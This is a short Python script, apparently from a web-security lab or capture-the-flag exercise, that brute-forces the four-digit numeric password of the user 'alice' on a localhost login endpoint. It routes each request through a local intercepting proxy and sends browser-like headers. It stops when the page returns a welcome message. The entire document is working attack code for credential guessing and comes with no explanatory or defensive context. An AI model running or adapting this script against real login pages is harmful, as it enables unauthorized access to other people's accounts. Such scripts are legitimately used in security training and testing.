import requests
http_proxy = 'http://localhost:8080'
https_proxy =  'https://localhost:8080'

proxies = { 
    "http"  : http_proxy, 
    "https" : https_proxy
}

data = { 'username': 'alice' }
headers = {
   'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'Accept-Language': 'en-US,en;q=0.5',
   'Accept-Encoding': 'gzip, deflate',
   'Referer': 'http://localhost/login',
   'Content-Type': 'application/x-www-form-urlencoded',
   'Connection': 'close'
}
for password_int in range(1000,9999):
    print (password_int)
    data['password'] = str(password_int)
    res = requests.post(
        'http://localhost/verify',
         data=data,
         proxies=proxies,
         headers=headers
         )
    if 'alice, Welcome!' in res.text:
        print('Password Found:', password_int)
        break

